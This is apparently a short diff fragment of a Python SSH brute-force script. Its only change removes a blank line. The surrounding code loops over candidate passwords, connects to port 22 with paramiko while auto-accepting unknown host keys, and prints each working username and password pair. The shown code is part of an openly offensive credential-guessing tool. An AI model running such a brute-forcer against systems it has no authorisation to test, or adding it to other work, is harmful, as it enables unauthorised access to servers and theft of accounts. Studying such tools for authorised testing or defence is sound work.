@@ -13,7 +13,6 @@ def run(args):
         for password in passwords:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
             try:
                 ssh.connect(ip_address, port=22, username=username, password=password)
                 print(f'Login successful - Username: {username} Password: {password}')
